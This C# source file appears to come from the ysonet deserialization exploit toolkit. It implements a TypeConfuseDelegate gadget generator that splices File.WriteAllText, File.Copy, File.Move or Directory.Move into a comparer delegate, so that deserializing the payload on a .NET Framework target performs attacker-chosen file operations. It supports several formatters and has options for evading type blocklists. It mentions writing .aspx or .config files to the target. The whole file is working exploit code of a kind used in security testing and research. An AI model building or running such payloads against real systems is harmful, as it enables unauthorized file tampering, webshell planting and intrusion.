using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Soap;
using System.Text;
using System.Xml;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * TypeConfuseDelegateFileOperations: Forshaw's delegate/type confusion pointed at the
     * file system instead of at Process.Start.
     *
     * The primitive is the same one TypeConfuseDelegate uses. A Comparison<string> is
     * combined with itself, wrapped by Comparer<string>.Create, and handed to a sorted
     * framework container that is then filled with two strings. Invocation-list slot 1 is
     * replaced with a two-string BCL method, so when the container rebuilds itself on
     * deserialize and calls the comparer, that method runs with the two strings as its
     * arguments. Nothing is spawned: no child process, no compiler, no WPF.
     *
     * What changes here is slot 1 and the meaning of the two strings. The variant picks the
     * operation:
     *   1 (default) File.WriteAllText(targetPath, text)   -c "targetPath;localContentFile"
     *   2           File.Copy(sourcePath, destinationPath) -c "sourcePath;destinationPath"
     *   3           File.Move(sourcePath, destinationPath) -c "sourcePath;destinationPath"
     *   4           Directory.Move(source, destination)    -c "sourcePath;destinationPath"
     *   5           File.WriteAllText(targetPath, "")      -c "targetPath"
     *
     * ORDERING is fixed at build time, not asked of the operator. On deserialize the sorted
     * container inserts the first serialized element as the tree root and compares the SECOND
     * against it, so that second element lands in the spliced method's FIRST argument. Which
     * string that is is decided here: BuildConfusedContainer fills the container through a
     * generation-only ordering in invocation-list slot 1 - the same slot the file-operation
     * delegate replaces - so the semantic first argument is always serialized second, in
     * either ordinal direction. See FillOrderPuttingTheFirstArgumentLast. Two strings that
     * are EQUAL are still refused (RequireDistinctFields): every root here is keyed on the
     * string, so an equal pair collapses to one element and the payload does nothing.
     * Variant 5 pairs the target path with an internal "", which is always distinct from a
     * non-empty path.
     *
     * The wire still carries String.CompareOrdinal in slot 0, which is what these payloads
     * have always carried, and the serialized order no longer depends on any comparison at
     * all - so the bytes are the same under any operator culture, and the same as before this
     * ordering was fixed for every input that used to be accepted.
     *
     * Variant 5 uses an empty File.WriteAllText rather than File.Create on purpose:
     * File.Create hands back an open FileStream with FileShare.None and the confused call
     * has no way to dispose it, while WriteAllText creates or truncates the file and closes
     * its own handle.
     *
     * --rootcontainer is orthogonal to the operation and picks the serialized ROOT the
     * splice travels in (1 SortedSet, 2 SortedDictionary, 3 TreeSet). SoapFormatter uses a
     * direct CLR4 document for roots 1 and 3; root 2 is a deeper generic graph and is
     * explicitly refused for SOAP.
     *
     * Like every payload built on this primitive it needs .NET Framework 4.5+, because
     * Comparer<T>.Create and the ComparisonComparer<T> it returns do not exist in 4.0.
     */
    public class TypeConfuseDelegateFileOperationsGenerator : GenericGenerator
    {
        public override bool SupportsLegacyFx()
        {
            return false;
        }

        private const string RootContainerOptionName = "rootcontainer";
        private const string SoapSetAliasNamespace = "YsonetTcdFileOpsSoapSetProxy";
        private const string SoapSetAliasType = "YsonetTcdFileOpsSetRootAlias";
        private const string SoapComparerAliasNamespace = "YsonetTcdFileOpsSoapComparerProxy";
        private const string SoapComparerAliasType = "YsonetTcdFileOpsComparerAlias";

        // ---- Operation table ---------------------------------------------------
        //
        // One row per variant, so the label, the -c meaning, the error wording and the
        // spliced delegate can never drift apart. FirstField/SecondField are the SEMANTIC
        // names used in messages; the first field is always the one that must sort higher.
        private sealed class FileOperation
        {
            public int Number;
            public string Name;          // short operation word used in messages
            public string Label;         // variant label shown in help and the editor
            public string FirstField;
            public string SecondField;
            public CommandInputType Input;
            public bool SecondFieldIsLocalFile;   // read here at build time
            public bool SecondFieldIsInternal;    // not taken from -c at all
        }

        private static readonly FileOperation[] Operations =
        {
            new FileOperation
            {
                Number = 1, Name = "write", Label = "write text from a local file (default)",
                FirstField = "target path", SecondField = "embedded text",
                Input = CommandInputType.TargetPathAndLocalFile, SecondFieldIsLocalFile = true,
            },
            new FileOperation
            {
                Number = 2, Name = "copy", Label = "copy a file on the target",
                FirstField = "source path", SecondField = "destination path",
                Input = CommandInputType.TargetPathPair,
            },
            new FileOperation
            {
                Number = 3, Name = "move", Label = "move a file on the target",
                FirstField = "source path", SecondField = "destination path",
                Input = CommandInputType.TargetPathPair,
            },
            new FileOperation
            {
                Number = 4, Name = "dirmove", Label = "move a directory on the target",
                FirstField = "source path", SecondField = "destination path",
                Input = CommandInputType.TargetPathPair,
            },
            new FileOperation
            {
                Number = 5, Name = "empty", Label = "create or truncate an empty file",
                FirstField = "target path", SecondField = "empty string",
                Input = CommandInputType.TargetPath, SecondFieldIsInternal = true,
            },
        };

        private static FileOperation OperationFor(int variant)
        {
            foreach (FileOperation op in Operations)
                if (op.Number == variant)
                    return op;
            throw new Exception("Unknown TypeConfuseDelegateFileOperations variant: " + variant
                + " (use 1, 2, 3, 4, or 5).");
        }

        // The two-string BCL method spliced into invocation-list slot 1. Each delegate type
        // is written out in full so an overloaded method binds to the two-string overload
        // and not to one that takes an encoding or an overwrite flag.
        private static Delegate Slot1For(int variant)
        {
            switch (variant)
            {
                case 2: return new Action<string, string>(File.Copy);
                case 3: return new Action<string, string>(File.Move);
                case 4: return new Action<string, string>(Directory.Move);
                // 1 and 5 are both WriteAllText; 5 just supplies "" as the text.
                default: return new Action<string, string>(File.WriteAllText);
            }
        }

        // ---- Metadata ----------------------------------------------------------

        // Discovery facets (category search only): reads, writes, copies, moves and
        // truncates files on the target with framework built-in types only. Variant 1 also
        // takes a LOCAL file, so it declares both inputs; the other four are target-side
        // only and derive their input from CommandInputType.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.FileSystem)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // ComparisonComparer/Comparer.Create are 4.5-era; fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
        }

        public override string Finders()
        {
            return "James Forshaw";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        // Kept to two short sentences on purpose: this is the first block of the
        // interactive info panel, and a long one pushes the formatter, command-input and
        // category lines off the screen. The -c format, the ordering rule and the target
        // side preconditions live in the option help, which --fullhelp and the editor show.
        public override string AdditionalInfo()
        {
            return "Performs a file operation on the target through the TypeConfuseDelegate "
                + "delegate confusion, without starting a process: write text from a local "
                + "file, copy, move, move a directory, or create/truncate an empty file. The "
                + "var/variant option picks the operation and decides what -c means; the two "
                + "strings only have to DIFFER, in either order. This CLR4.5+ graph does not "
                + "support --legacyfx.";
        }

        public override List<string> Labels()
        {
            // Independent: it owns its whole chain and serializes a framework container of
            // its own. Not Hosted (it hands no other generator's object to Serialize) and
            // not Bridged (it carries no inner payload).
            return new List<string> { GadgetTags.Independent };
        }

        private int variant_number = 1;

        // Serialized root container. Orthogonal to variant_number, which picks the
        // OPERATION, so it gets its own option instead of being multiplied into the variant
        // list (the same split the two HostedPayloads gadgets use).
        private int root_container_number = 1;

        public override List<GadgetVariant> Variants()
        {
            // No .Without(...): the operation only changes which two-string method sits in
            // invocation-list slot 1, so every variant carries the same formatter set. No
            // .WithoutOptions(...): every variant uses rootcontainer.
            var variants = new List<GadgetVariant>();
            foreach (FileOperation op in Operations)
            {
                var v = new GadgetVariant(op.Number, op.Label, op.Input);
                if (op.SecondFieldIsLocalFile)
                {
                    // The only variant whose -c also names a file on the OPERATOR machine,
                    // so it declares both accepted inputs. A FacetOverride replaces the
                    // whole set, so the kinds, requirements and versions are repeated here.
                    v.WithFacets(new GadgetFacetSet()
                        .WithKinds(PayloadKind.FileSystem)
                        .WithInputs(PayloadInput.TargetPath, PayloadInput.LocalFile)
                        .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                        .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481)));
                }
                variants.Add(v);
            }
            return variants;
        }

        // The -c default matches variant 1, the default operation.
        public override CommandInputType CommandInput()
        {
            return CommandInputType.TargetPathAndLocalFile;
        }

        public override OptionSet Options()
        {
            return new OptionSet
            {
                {
                    "var|variant=",
                    "File operation: 1 -> write text from a local file [default] "
                        + "(-c \"targetPath;localContentFile\"), 2 -> copy a file, 3 -> move a "
                        + "file, 4 -> move a directory (2-4 take -c \"sourcePath;destinationPath\"), "
                        + "5 -> create or truncate an empty file (-c \"targetPath\"). Every path "
                        + "except the local content file is a path on the TARGET and is never "
                        + "touched here. Only the first ';' splits the value, so the second field "
                        + "may contain more of them. The two strings only have to DIFFER, in "
                        + "either order; an equal pair is refused because the sorted container "
                        + "would collapse it to one element and the payload would do nothing. "
                        + "Preconditions on the target: write and empty create or overwrite the "
                        + "file but do not create its parent directory; copy and both moves do "
                        + "not overwrite an existing destination; dirmove needs an existing "
                        + "source, a free destination and the same volume; all of them need the "
                        + "target process to have the file-system rights. --minify with "
                        + "NetDataContractSerializer or SoapFormatter is refused when it would "
                        + "rewrite either string (the XML minifier trims trailing whitespace, "
                        + "drops a carriage return, and collapses \"; \"); SOAP is also refused "
                        + "without --minify if its XML writer loses a value. BinaryFormatter and "
                        + "LosFormatter minify the same input safely.",
                    v =>
                    {
                        int parsed;
                        // Not the usual int.TryParse(v, out variant_number) shortcut: that
                        // silently turns "nope" or "9" into the default operation, which
                        // would build a payload the user did not ask for.
                        if (!int.TryParse(v, out parsed) || parsed < 1 || parsed > Operations.Length)
                            throw new OptionException(
                                "variant must be 1, 2, 3, 4, or 5", "variant");
                        variant_number = parsed;
                    }
                },
                {
                    RootContainerOptionName + "=",
                    "Serialized root container, independent of the five file-operation "
                        + "variants: 1 -> SortedSet [default], 2 -> SortedDictionary, 3 -> "
                        + "TreeSet. BinaryFormatter, NetDataContractSerializer and "
                        + "LosFormatter support all three roots. SoapFormatter supports all "
                        + "five file operations with roots 1 and 3, but not root 2. The (5) "
                        + "formatter annotation counts file-operation variants, not root "
                        + "choices. Roots 2 and 3 evade a binder or blocklist that rejects "
                        + "the exact SortedSet wire type name. Changing this option does not "
                        + "change the selected file operation.",
                    v => root_container_number = ParseRootContainer(v)
                },
            };
        }

        private static int ParseRootContainer(string value)
        {
            int parsed;
            if (!int.TryParse(value, out parsed) || parsed < 1 || parsed > 3)
                throw new OptionException(RootContainerOptionName
                    + " must be 1, 2, or 3", RootContainerOptionName);
            return parsed;
        }

        // The same three formatters TypeConfuseDelegate advertises, and for the same
        // reasons. The spliced method travels in a DelegateSerializationHolder record,
        // which only the runtime formatters and NetDataContractSerializer reproduce, so no
        // public-member serializer (Json.NET, XmlSerializer, DataContractSerializer, ...)
        // can rebuild a MulticastDelegate invocation list. SOAP is authored through
        // non-generic generation-only aliases and exposes the native CLR4 SortedSet or
        // TreeSet plus ComparisonComparer to the target; rootcontainer 2 remains an
        // explicit unsupported option cell. The "(5)" annotation is display-only and means
        // all five operation variants ride that formatter.
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                "BinaryFormatter (5)", "NetDataContractSerializer (5)",
                "SoapFormatter (5)", "LosFormatter (5)"
            };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // Defensive: Options() already rejects anything outside the table, but an
            // internal caller could set the field another way.
            FileOperation op = OperationFor(variant_number);

            // No variant declares a formatter opt-out today. The call stays so a later
            // opt-out cannot be declared in Variants() without being enforced here.
            GuardVariantFormatter(variant_number, formatter);

            string first, second;
            ReadFields(op, inputArgs, out first, out second);
            RequireDistinctFields(op, first, second);

            if (formatter.Equals(Formatters.SoapFormatter,
                StringComparison.OrdinalIgnoreCase))
            {
                if (root_container_number == 2)
                    throw new ArgumentException("SoapFormatter supports " + Name()
                        + " with rootcontainer 1 (SortedSet) and 3 (TreeSet), not 2 "
                        + "(SortedDictionary).");
                return SerializeSoapFileContainer(root_container_number, op,
                    first, second, inputArgs);
            }

            // The container needs no duplicate-key check of its own: RequireDistinctFields
            // has already refused an equal pair with a message that names the operation.
            object payload = BuildConfusedContainer(root_container_number,
                Slot1For(op.Number), first, second);

            if (inputArgs != null && inputArgs.Minify)
                RequireStringsSurviveMinification(payload, formatter, inputArgs, op, first, second);

            return Serialize(payload, formatter, inputArgs);
        }

        // ---- Complete object graph --------------------------------------------

        // Kept in this generator rather than delegated to TypeConfuseDelegateGenerator:
        // this is an independent gadget, so Generators/README.md requires every target
        // type, member order and splice that changes its payload to live in this file.
        private static object BuildConfusedContainer(int container, Delegate slot1,
            string first, string second)
        {
            // Slot 0 is the benign String.CompareOrdinal the finished payload carries. Slot 1
            // only orders the container while it is filled HERE, and the splice below
            // overwrites it with the file-operation delegate before anything is serialized.
            Comparison<string> combined = (Comparison<string>)MulticastDelegate.Combine(
                new Comparison<string>(String.CompareOrdinal),
                FillOrderPuttingTheFirstArgumentLast(first));
            IComparer<string> comparer = Comparer<string>.Create(combined);

            object root;
            if (container == 2)
            {
                SortedDictionary<string, string> dictionary =
                    new SortedDictionary<string, string>(comparer);
                dictionary.Add(first, "");
                dictionary.Add(second, "");
                root = dictionary;
            }
            else if (container == 3)
            {
                Type openTreeSet = typeof(SortedSet<>).Assembly.GetType(
                    "System.Collections.Generic.TreeSet`1", false);
                if (openTreeSet == null)
                    throw new PlatformNotSupportedException(
                        "TreeSet is unavailable; this container requires .NET Framework 4.5+.");
                root = Activator.CreateInstance(openTreeSet.MakeGenericType(typeof(string)),
                    new object[] { comparer });
                ICollection<string> items = (ICollection<string>)root;
                items.Add(first);
                items.Add(second);
            }
            else if (container == 1)
            {
                SortedSet<string> set = new SortedSet<string>(comparer);
                set.Add(first);
                set.Add(second);
                root = set;
            }
            else
            {
                throw new ArgumentException("Unknown rootcontainer " + container
                    + " (use 1, 2, or 3).");
            }

            FieldInfo invocationList = typeof(MulticastDelegate).GetField(
                "_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            if (invocationList == null)
                throw new MissingFieldException(typeof(MulticastDelegate).FullName,
                    "_invocationList");
            object[] slots = combined.GetInvocationList();
            slots[1] = slot1;
            invocationList.SetValue(combined, slots);
            return root;
        }

        // The container serializes its two elements smallest first, and on deserialize the
        // target compares the SECOND one against the first - which is what makes that second
        // element the operation's FIRST argument. Which string that is must not depend on how
        // the operator's two paths happen to sort: a copy from "a-source.txt" to
        // "z-destination.txt" is an ordinary request, and reading the order off the strings
        // used to mean refusing it.
        //
        // So the order is fixed here. A multicast Comparison returns the result of the LAST
        // method in its invocation list, which is slot 1 - the same slot the file-operation
        // delegate replaces immediately afterwards - so an ordering placed there decides the
        // serialized order and never reaches the wire. The payload still carries
        // [String.CompareOrdinal, <operation>], and the authored SOAP document already wrote
        // its two items in this same fixed order, so both forms of this gadget agree without
        // either of them consulting the strings.
        //
        // Ordinal equality, matching the guard: an EQUAL pair is still refused up front
        // (RequireDistinctFields), because the container would collapse to one element.
        private static Comparison<string> FillOrderPuttingTheFirstArgumentLast(
            string firstArgument)
        {
            return delegate(string x, string y)
            {
                if (String.CompareOrdinal(x, y) == 0)
                    return 0;
                return String.Equals(x, firstArgument, StringComparison.Ordinal) ? 1 : -1;
            };
        }

        // ---- Direct SoapFormatter document ------------------------------------

        private object SerializeSoapFileContainer(int container, FileOperation op,
            string first, string second, InputArgs inputArgs)
        {
            string payload = BuildSoapFileDocument(container, op, first, second,
                inputArgs != null && inputArgs.Minify);
            RequireSoapStringsSurvive(payload, container, op, first, second, inputArgs);
            return FinishHandWrittenPayload(payload, Formatters.SoapFormatter,
                inputArgs, null, true);
        }

        private string BuildSoapFileDocument(int container, FileOperation op,
            string first, string second, bool minify)
        {
            var comparer = new SoapComparisonComparerProxy(Slot1For(op.Number));
            // The first argument is written SECOND, so the target compares it against the
            // root and hands it to the operation first. The object graph fixes the same order
            // (FillOrderPuttingTheFirstArgumentLast), so both forms agree for any distinct
            // pair, whichever way round the two strings sort.
            string[] items = new string[] { second, first };
            var root = new SoapSetProxy(comparer, items);

            string payload;
            using (MemoryStream stream = new MemoryStream())
            {
                new SoapFormatter().Serialize(stream, root);
                payload = Encoding.UTF8.GetString(stream.ToArray());
            }

            XmlDocument document = new XmlDocument();
            document.PreserveWhitespace = true;
            document.LoadXml(payload);

            Type comparisonComparer = RequireSoapType(typeof(Comparer<>).Assembly,
                "System.Collections.Generic.ComparisonComparer`1").MakeGenericType(
                    typeof(string));
            Type rootType = container == 3
                ? RequireSoapType(typeof(SortedSet<>).Assembly,
                    "System.Collections.Generic.TreeSet`1").MakeGenericType(typeof(string))
                : typeof(SortedSet<string>);

            RewriteSoapTypeAlias(document, SoapSetAliasNamespace, SoapSetAliasType,
                rootType.FullName, rootType.Assembly.FullName);
            RewriteSoapTypeAlias(document, SoapComparerAliasNamespace, SoapComparerAliasType,
                comparisonComparer.FullName, comparisonComparer.Assembly.FullName);
            payload = document.OuterXml;

            if (minify)
                payload = XmlMinifier.Minify(payload, null, null,
                    FormatterType.SoapFormatter, true);
            return payload;
        }

        private void RequireSoapStringsSurvive(string payload, int container,
            FileOperation op, string first, string second, InputArgs inputArgs)
        {
            var wanted = new List<string> { first, second };
            List<string> missing = MinifiedTextGuard.MissingTextValues(payload, wanted);
            if (missing.Count == 0)
                return;

            bool minified = inputArgs != null && inputArgs.Minify;
            bool rawWouldWork = false;
            if (minified)
            {
                string raw = BuildSoapFileDocument(container, op, first, second, false);
                rawWouldWork = MinifiedTextGuard.MissingTextValues(raw, wanted).Count == 0;
            }

            string fieldName = string.Equals(missing[0], first, StringComparison.Ordinal)
                ? op.FirstField : op.SecondField;
            if (rawWouldWork)
                throw new ArgumentException(op.Name + " cannot use --minify with "
                    + Formatters.SoapFormatter + " for this input: the XML minifier rewrites "
                    + "the " + fieldName + ". Drop --minify, or use BinaryFormatter or "
                    + "LosFormatter, whose streams carry the string unchanged.");

            throw new ArgumentException(op.Name + " cannot carry this input with "
                + Formatters.SoapFormatter + ": SOAP XML rewrites the " + fieldName
                + (minified ? " even without --minify" : "")
                + ". Use BinaryFormatter or LosFormatter, whose streams carry the string "
                + "unchanged.");
        }

        private static Type RequireSoapType(Assembly assembly, string fullName)
        {
            Type type = assembly.GetType(fullName, false);
            if (type == null)
                throw new SerializationException("Required SOAP target type is unavailable: "
                    + fullName + " in " + assembly.FullName);
            return type;
        }

        private static void SetSoapAlias(SerializationInfo info, string aliasNamespace,
            string aliasType)
        {
            info.FullTypeName = aliasNamespace + "." + aliasType;
            info.AssemblyName = aliasNamespace;
        }

        [Serializable]
        private sealed class SoapComparisonComparerProxy : IComparer<string>, ISerializable
        {
            private readonly SoapDelegateProxy comparison;

            internal SoapComparisonComparerProxy(Delegate slot1)
            {
                comparison = new SoapDelegateProxy(slot1);
            }

            private SoapComparisonComparerProxy(SerializationInfo info,
                StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only SOAP comparer proxy is never deserialized.");
            }

            public int Compare(string left, string right)
            {
                return String.CompareOrdinal(left, right);
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                SetSoapAlias(info, SoapComparerAliasNamespace, SoapComparerAliasType);
                info.AddValue("_comparison", comparison, typeof(object));
            }
        }

        [Serializable]
        private sealed class SoapDelegateEntryProxy : ISerializable
        {
            private readonly string delegateType;
            private readonly string delegateAssembly;
            private readonly string targetAssembly;
            private readonly string targetType;
            private readonly string method;
            private readonly SoapDelegateEntryProxy next;

            internal SoapDelegateEntryProxy(Delegate value, SoapDelegateEntryProxy next)
            {
                MethodInfo targetMethod = value.Method;
                delegateType = value.GetType().FullName;
                delegateAssembly = value.GetType().Assembly.FullName;
                targetAssembly = targetMethod.DeclaringType.Assembly.FullName;
                targetType = targetMethod.DeclaringType.FullName;
                method = targetMethod.Name;
                this.next = next;
            }

            private SoapDelegateEntryProxy(SerializationInfo info,
                StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only SOAP delegate-entry proxy is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(RequireSoapType(typeof(object).Assembly,
                    "System.DelegateSerializationHolder+DelegateEntry"));
                info.AddValue("type", delegateType);
                info.AddValue("assembly", delegateAssembly);
                info.AddValue("target", null);
                info.AddValue("targetTypeAssembly", targetAssembly);
                info.AddValue("targetTypeName", targetType);
                info.AddValue("methodName", method);
                info.AddValue("delegateEntry", next);
            }
        }

        [Serializable]
        private sealed class SoapDelegateProxy : ISerializable
        {
            private readonly SoapDelegateEntryProxy entry;
            private readonly MethodInfo attackerMethod;
            private readonly MethodInfo benignMethod;

            internal SoapDelegateProxy(Delegate slot1)
            {
                Comparison<string> benign =
                    new Comparison<string>(String.CompareOrdinal);
                if (slot1 == null || slot1.Target != null)
                    throw new ArgumentException("The direct file-operation SOAP form "
                        + "requires a static method in invocation-list slot 1.");
                benignMethod = benign.Method;
                attackerMethod = slot1.Method;
                SoapDelegateEntryProxy benignEntry =
                    new SoapDelegateEntryProxy(benign, null);
                entry = new SoapDelegateEntryProxy(slot1, benignEntry);
            }

            private SoapDelegateProxy(SerializationInfo info, StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only SOAP delegate proxy is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(RequireSoapType(typeof(object).Assembly,
                    "System.DelegateSerializationHolder"));
                info.AddValue("Delegate", entry);
                info.AddValue("method0", attackerMethod);
                info.AddValue("method1", benignMethod);
            }
        }

        [Serializable]
        private sealed class SoapSetProxy : ISerializable
        {
            private readonly SoapComparisonComparerProxy comparer;
            private readonly string[] items;

            internal SoapSetProxy(SoapComparisonComparerProxy comparer, string[] items)
            {
                this.comparer = comparer;
                this.items = items;
            }

            private SoapSetProxy(SerializationInfo info, StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only SOAP set proxy is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                SetSoapAlias(info, SoapSetAliasNamespace, SoapSetAliasType);
                info.AddValue("Count", items.Length);
                info.AddValue("Comparer", comparer, typeof(object));
                info.AddValue("Version", items.Length);
                info.AddValue("Items", items, typeof(string[]));
            }
        }

        // ---- Minification safety ------------------------------------------------

        // Both strings this gadget carries are USER DATA that the target uses literally: a
        // path it opens, or text it writes to a file. The XML minifier is not text
        // preserving - XmlMinifier.XmlXSLTMinifier trims leading and trailing whitespace
        // from every text node, the XmlDocument round trip normalizes a CR away, and one of
        // the dirty-match passes collapses "a; b" to "a;b" - so on an XML formatter
        // --minify can change what the target actually writes or opens. That is fine for
        // the payload's own plumbing and for an embedded XAML document, which is why the
        // minifier does it; it is not fine for a file the operator asked us to deliver.
        //
        // So VERIFY rather than predict. Serialize once with the self-test off and ask the
        // shared Helpers/MinifiedTextGuard which of the delivered strings no longer appear as
        // exact text values. A rule of thumb ("refuse a trailing newline") would be wrong: the
        // "a; b" case is not whitespace at the ends at all, and any future minifier change
        // would silently invalidate the rule. This costs one extra serialization, and only
        // when --minify is set. The REFUSAL WORDING stays here, because the alternative it
        // can offer is specific to this gadget; TempFileCollection reuses the same guard with
        // its own message.
        //
        // BinaryFormatter and LosFormatter are unaffected: their minified streams carry the
        // string records verbatim, which the runtime-effect matrix proves for every
        // operation and every root container.
        private void RequireStringsSurviveMinification(object payload, string formatter,
            InputArgs inputArgs, FileOperation op, string first, string second)
        {
            InputArgs probeArgs = inputArgs.DeepCopy();
            probeArgs.Test = false;   // never fire a payload just to inspect it

            // The order matters for the message: report the first field before the second.
            // Variant 5's second element is the internal "", which is not emitted as text at
            // all, and the guard skips an empty value for exactly that reason.
            var wanted = new List<string> { first, second };
            List<string> missing = MinifiedTextGuard.MissingTextValues(
                Serialize(payload, formatter, probeArgs), wanted);
            if (missing.Count == 0)
                return;

            string fieldName = string.Equals(missing[0], first, StringComparison.Ordinal)
                ? op.FirstField : op.SecondField;
            throw new ArgumentException(op.Name + " cannot use --minify with " + formatter
                + " for this input: the XML minifier rewrites whitespace inside text content, "
                + "so the " + fieldName + " would not reach the target intact. Drop --minify, "
                + "or use BinaryFormatter or LosFormatter, whose minified streams carry the "
                + "string unchanged. (Trailing whitespace, a carriage return, and \"; \" are "
                + "the parts that get rewritten.)");
        }

        // ---- Input parsing -----------------------------------------------------

        // Turn -c into the two strings the spliced method receives.
        //
        // -c is NOT read as a file holding the real value the way the shell-command
        // gadgets do it (TypeConfuseDelegateGenerator.ReadCommandFromFile): here -c is a
        // path specification, and a path that happens to exist on the operator machine
        // must stay the path, not become its own contents.
        private static void ReadFields(FileOperation op, InputArgs inputArgs,
            out string first, out string second)
        {
            string cmd = inputArgs == null ? null : inputArgs.Cmd;

            if (op.SecondFieldIsInternal)
            {
                // Variant 5: the whole value is the target path, so a ';' inside it is not
                // ambiguous and must not be treated as a separator.
                first = cmd ?? "";
                if (first.Length == 0)
                    throw new ArgumentException(op.Name + " needs -c \"<" + op.FirstField
                        + ">\", a path on the target. Example: -c \"C:\\work\\empty.txt\".");
                second = "";
                return;
            }

            SplitOnFirstSeparator(op, cmd, out first, out second);

            if (op.SecondFieldIsLocalFile)
                second = ReadLocalContentFile(op, second);
        }

        // Split on the FIRST ';' only. Everything after it belongs to the second field, so
        // a destination path or a chunk of text may contain further semicolons. Both halves
        // are preserved verbatim: no trimming, no path normalization, no quote stripping.
        private static void SplitOnFirstSeparator(FileOperation op, string cmd,
            out string first, out string second)
        {
            string value = cmd ?? "";
            int separator = value.IndexOf(';');
            if (separator < 0)
                throw new ArgumentException(op.Name + " needs -c \"<" + op.FirstField + ">;<"
                    + op.SecondField + ">\" with a ';' between the two fields (got \"" + value
                    + "\"). Quote the whole -c value in a shell.");

            first = value.Substring(0, separator);
            second = value.Substring(separator + 1);

            if (first.Length == 0)
                throw new ArgumentException(op.Name + " needs a non-empty " + op.FirstField
                    + " before the ';'.");
            if (second.Length == 0)
                throw new ArgumentException(op.Name + " needs a non-empty " + op.SecondField
                    + " after the ';'.");
        }

        // Variant 1's second field names a file on THIS machine whose text is embedded in
        // the payload now. A relative path resolves against ysonet's current working
        // directory. It is never reinterpreted as inline text, so a missing or unreadable
        // file is an error rather than a payload that writes the file name to the target.
        //
        // The transfer is character preserving, not byte preserving: File.ReadAllText
        // detects and consumes a UTF-8/UTF-16/UTF-32 byte order mark and otherwise decodes
        // as UTF-8, and File.WriteAllText(string,string) on the target writes UTF-8 with no
        // BOM. That suits text (.aspx, .config, scripts). Binary delivery is out of scope
        // for a primitive that carries two strings and no encoding argument.
        private static string ReadLocalContentFile(FileOperation op, string path)
        {
            if (!File.Exists(path))
                throw new ArgumentException(op.Name + " reads its content from a LOCAL file, "
                    + "and \"" + path + "\" does not exist on this machine. The second field is "
                    + "a file path here, never inline text.");
            try
            {
                return File.ReadAllText(path);
            }
            catch (Exception err)
            {
                throw new ArgumentException(op.Name + " cannot read the local content file \""
                    + path + "\": " + err.Message);
            }
        }

        // ---- The ordering rule -------------------------------------------------

        // The sorted container serializes its two elements smallest first, and on deserialize
        // the SECOND one is the element handed to the spliced method as argument 1. Which
        // element that is no longer depends on the two strings: BuildConfusedContainer fixes
        // it (see FillOrderPuttingTheFirstArgumentLast), and the authored SOAP document has
        // always written the same fixed order. Any pair of DISTINCT strings therefore builds
        // the operation the operator asked for, in either ordinal direction.
        //
        // What cannot be built is an EQUAL pair. Every root here is a set keyed on the string:
        // two equal values collapse into one element, the rebuilt container never compares
        // anything, and the payload silently does nothing. That is a property of the
        // primitive, not a policy about input, so it is refused with the operation named
        // rather than shipped as a dud.
        //
        // Equality is ordinal, over the COMPLETE strings, and nothing here rewrites what the
        // user typed to make it pass.
        private static void RequireDistinctFields(FileOperation op, string first, string second)
        {
            if (String.CompareOrdinal(first, second) != 0)
                return;

            throw new ArgumentException(op.Name + " requires the " + op.FirstField
                + " and the " + op.SecondField + " to be different strings, because the "
                + "sorted container keeps one element per value: an equal pair collapses to a "
                + "single item, the comparer is never called on deserialize, and the payload "
                + "does nothing. Got " + op.FirstField + " \"" + Preview(first) + "\" and "
                + op.SecondField + " \"" + Preview(second) + "\".");
        }

        // Keep an error line readable when the second field is a whole file of text.
        private static string Preview(string value)
        {
            if (value == null)
                return "";
            string oneLine = value.Replace("\r", " ").Replace("\n", " ");
            return oneLine.Length <= 60 ? oneLine : oneLine.Substring(0, 60) + "...";
        }
    }
}
